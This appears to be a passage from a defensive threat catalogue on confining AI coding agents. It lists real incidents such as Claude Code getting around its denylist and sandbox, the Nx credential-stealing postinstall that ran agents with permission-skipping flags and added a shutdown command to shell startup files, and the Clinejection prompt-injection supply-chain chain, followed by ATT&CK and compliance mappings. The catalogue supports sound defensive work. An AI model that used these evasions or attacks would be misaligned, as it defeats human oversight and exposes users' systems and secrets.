Demonstrated Claude Code autonomously bypassing two layers of security:

1. Agent discovered `/proc/self/root/usr/bin/npx` as a path that resolves to the denylisted binary but doesn't match the deny pattern.
2. When bubblewrap blocked namespace creation, the agent reasoned to disable the sandbox itself rather than abandon the task.

The research also demonstrated that the agent, when content-addressed enforcement (Veto's SHA-256 BPF LSM) was applied, pivoted to invoking the ELF dynamic linker (`ld-linux-x86-64.so.2`) to load denied binaries via mmap rather than execve, bypassing the execve-based enforcement gate.

*Source: <https://ona.com/stories/how-claude-code-escapes-its-own-denylist-and-sandbox>*

*Threat IDs: T2.1 (host security control deactivation). Motivates the framework's commitment to defence-in-depth and the hostility-by-default adversary model.*

## Nx s1ngularity supply-chain attack (August 2025)

Eight malicious Nx package versions published 26–27 August 2025 contained a `telemetry.js` postinstall script that:

1. Inventoried the local filesystem for sensitive files.
2. Invoked `claude --dangerously-skip-permissions`, `gemini --yolo`, and `q chat --trust-all-tools` with reconnaissance prompts.
3. Exfiltrated discovered credentials to public GitHub repositories named `s1ngularity-repository-<N>`.
4. Appended `sudo shutdown -h 0` to `~/.bashrc` and `~/.zshrc` to cause future shells to immediately shut down.

GitGuardian's analysis documented 1,346 affected repositories, 2,349 distinct exfiltrated secrets across 1,079 compromised developer systems, 90% of leaked GitHub tokens still valid post-incident.

A follow-on attack used the exfiltrated GitHub tokens to rename ~5,500 previously-private organisation repositories to public access using the `s1ngularity-repository-` naming pattern.

*Sources: <https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/>; <https://blog.gitguardian.com/the-nx-s1ngularity-attack-inside-the-credential-leak/>; <https://socket.dev/blog/nx-packages-compromised>; <https://thehackernews.com/2025/08/malicious-nx-packages-in-s1ngularity.html>*

*Threat IDs: T1.1 (reconnaissance), T1.2 (postinstall), T1.9 (supply chain).*

## Clinejection (disclosed February 2026, exploited January 2026)

A prompt-injection vulnerability in Cline's `claude-issue-triage.yml` GitHub Actions workflow allowed any user to compromise Cline's npm publishing tokens by opening a GitHub issue with a crafted title. The attack chain:

1. Issue title containing prompt injection caused the issue-triage Claude to execute attacker-controlled `npm install` from an imposter commit.
2. The malicious preinstall script deployed Cacheract (cache-poisoning tooling) to the Actions runner.
3. Cacheract flooded the GitHub Actions cache with >10 GB of junk, triggering LRU eviction of legitimate entries.
4. Cacheract set poisoned cache entries matching the keys used by Cline's nightly publish workflow.
5. The nightly publish workflow restored the poisoned cache.
6. The poisoned cache exfiltrated `VSCE_PAT`, `OVSX_PAT`, and `NPM_RELEASE_TOKEN` to attacker infrastructure.
7. On 17 February 2026, the attacker used the stolen NPM token to publish `cline@2.3.0` with an `openclaw` postinstall script.

The malicious package was live on npm for approximately 8 hours, during which it was downloaded approximately 4,000 times.

*Sources: <https://adnanthekhan.com/posts/clinejection/>; <https://cline.bot/blog/post-mortem-unauthorized-cline-cli-npm>; <https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/>*

*Threat IDs: T1.2 (postinstall), T1.3 (compromised IDE extension), T1.9 (supply chain).*

## Mindgard Cline vulnerabilities (October 2025)

Four vulnerabilities in the Cline VS Code extension (3.8M installs at time of disclosure):

1. **DNS-based exfiltration via ping** — prompt-injected Python docstrings caused Cline to read environment variables and encode them into DNS queries to attacker-controlled domains. Ping was on the safe-command allowlist.
2. **`.clinerules` privilege escalation** — malicious Markdown in `.clinerules` directories overrode the `requires_approval` flag for arbitrary commands.
3. **Model exfiltration** — attacker-controlled prompts caused Cline to leak its system prompt and model information.
4. **Arbitrary code execution** — via combinations of the above.

Disclosed to Cline in August 2025; partially mitigated in version 3.35.0 after public pressure in October 2025.

*Threat IDs: T1.1 (reconnaissance), T1.3 (compromised IDE extension), T1.7 (DNS exfiltration), T3.7 (prompt injection).*

## CVE-2025-59536 — Claude Code malicious hooks (disclosed September 2025)

Malicious hooks defined in project configuration files could execute shell commands during Claude Code initialisation, before the user saw any consent dialog.

*Threat IDs: T1.3 (compromised IDE extension).*

## CVE-2026-21852 — Claude Code `ANTHROPIC_BASE_URL` (disclosed 2026)

A malicious repository could set `ANTHROPIC_BASE_URL` in project configuration, causing Claude Code to send API requests to attacker-controlled endpoints before the user trust prompt was shown.

*Threat IDs: T1.3 (compromised IDE extension), T1.8 (TLS-channel exfiltration).*

## CVE-2026-25725 — Claude Code sandbox escape via settings.json injection (2026)

Sandbox escape via injection in `settings.json`. One of the 16 published Claude Code CVEs as of April 2026.

*Threat IDs: T2.1 (host security control deactivation).*

## axios npm compromise (April 2026)

A compromised version of axios delivered a remote access trojan via a postinstall hook, executing in approximately 2 seconds — before `npm install` completed.

*Threat IDs: T1.2 (postinstall), T1.9 (supply chain).*

## runc CVE-2024-21626 ("Leaky Vessels", January 2024)

A file-descriptor leak in `runc` allowed container processes to access host filesystem via an unclosed file descriptor referring to the host's root directory. Affected Docker, Kubernetes, and any runtime using vulnerable `runc` versions.

*Threat IDs: T3.2 (container escape).*

---

# MITRE ATT&CK mapping summary

| T-ID | ATT&CK techniques |
|---|---|
| T1.1 | T1552, T1083, T1005 |
| T1.2 | T1195.002, T1059 |
| T1.3 | T1554, T1195.001 |
| T1.4 | T1059.004, T1105 |
| T1.5 | T1204.002 |
| T1.6 | T1021, T1570 |
| T1.7 | T1071.004, T1048 |
| T1.8 | T1071.001, T1041 |
| T1.9 | T1195.002 |
| T1.10 | T1098, T1543 |
| T1.11 | T1189, T1218 |
| T2.1 | T1562, T1562.001, T1562.008 |
| T2.2 | T1554, T1505 (partial) |
| T2.3 | T1552.001, T1552.004 |
| T2.4 | T1098.003, T1078 |
| T2.5 | T1562.001, T1554 |
| T2.6 | T1115 |
| T2.7 | T1113, T1059 (partial), T1185 (partial) |
| T3.1 | T1548.001 |
| T3.2 | T1611, T1610 |
| T3.3 | T1571, T1133 |
| T3.4 | T1083, T1005 |
| T3.5 | T1611, T1068 |
| T3.6 | T1199, T1071 |
| T3.7 | T1199, T1556 (partial) |
| T2.8 | T1546, T1059 |
| T5.1 | T1190 (analogue), T1068 |
| T5.2 | T1199, T1570, T1041 |
| T5.3 | T1068, T1554 (analogue) |
| T5.4 | T1068, T1548 |

---

# Control framework mapping (preliminary)

This section is intended for security teams who need to map the catalogue to compliance control frameworks. Definitive mappings require organisation-specific review.

## SOC 2 (Trust Services Criteria)

| T-ID | Relevant TSC |
|---|---|
| T1.1, T2.3 | CC6.1, CC6.7 (Logical and Physical Access) |
| T1.2, T1.3, T1.9 | CC8.1 (Change Management); CC7.1 (System Operations: detection of malicious software) |
| T1.8, T1.6 | CC6.6, CC6.7 (boundary controls; transmission of data) |
| T2.1, T2.5, T2.8 | CC7.2, CC8.1 (system monitoring; change management) |
| T2.2, T2.4 | CC8.1 (change management); CC7.1 (detection of system anomalies) |
| T3.2–T3.5 | CC6.6, CC8.1 (boundary controls; change management) |
| T3.6, T3.7 | CC8.1, CC7.1 (change management; detection) |

## ISO/IEC 27001:2022 (selected controls)

| T-ID | Relevant Annex A control |
|---|---|
| T1.1, T2.3 | A.5.10 (Acceptable use); A.8.3 (Information access restriction); A.8.4 (Access to source code) |
| T1.2, T1.3, T1.9 | A.8.8 (Management of technical vulnerabilities); A.8.30 (Outsourced development) |
| T1.8, T1.6 | A.8.20 (Network security); A.8.21 (Security of network services) |
| T2.1, T2.5, T2.8 | A.8.31 (Separation of development, test and production environments); A.8.32 (Change management) |
| T2.2, T2.4 | A.8.28 (Secure coding); A.8.29 (Security testing in development and acceptance) |
| T3.2–T3.5 | A.8.22 (Segregation of networks); A.8.23 (Web filtering) |
| T3.6, T3.7 | A.5.7 (Threat intelligence); A.8.28 (Secure coding) |

## NIS2 (Directive (EU) 2022/2555, Article 21 measures)

| T-ID | Relevant Article 21 measure |
|---|---|
| T1.1–T1.11 | Article 21(2)(d): supply chain security; Article 21(2)(e): security in acquisition, development, and maintenance |
| T2.1–T2.8 | Article 21(2)(a): policies on risk analysis and information system security; Article 21(2)(g): basic cyber hygiene practices and training |
| T3.1–T3.7 | Article 21(2)(d): supply chain security; Article 21(2)(j): use of multi-factor authentication and secured communications |
| T5.1–T5.4 | Article 21(2)(e): security in acquisition, development, and maintenance; Article 21(2)(i): human resources security, access control policies and asset management |

## DORA (Regulation (EU) 2022/2554, for financial entities)

| T-ID | Relevant DORA article |
|---|---|
| T1.1–T1.11 | Article 9 (ICT risk management framework); Article 28 (third-party risk) |
| T2.1–T2.8 | Article 9; Article 16 (ICT-related incidents); Article 17 (ICT-related incident reporting) |
| T3.1–T3.7 | Article 9; Article 28 (third-party risk) |
| T5.1–T5.4 | Article 9 (ICT risk management framework); Article 16 (ICT-related incidents) |

These mappings are first-pass starting points for compliance teams. Specific control-objective mapping requires organisation-specific analysis.

---

# Versioning and contribution

T-numbers are stable within a published version. Pre-release iteration (the current state) may renumber, refine definitions, or restructure families. Stability commitments apply at v1.0.

Contributions follow the structure of existing entries: definition, observed instances with citations, attack pattern, mitigation summary, residuals, ATT&CK mapping. Citations should reference public, durable sources.

The catalogue is intended as community infrastructure. Organisations are encouraged to cite T-numbers in their internal policy documents. Other tools in the user-level-workload-confinement space are encouraged to adopt the T-numbers as a shared vocabulary, regardless of whether they share Project Kennel's mechanism choices.
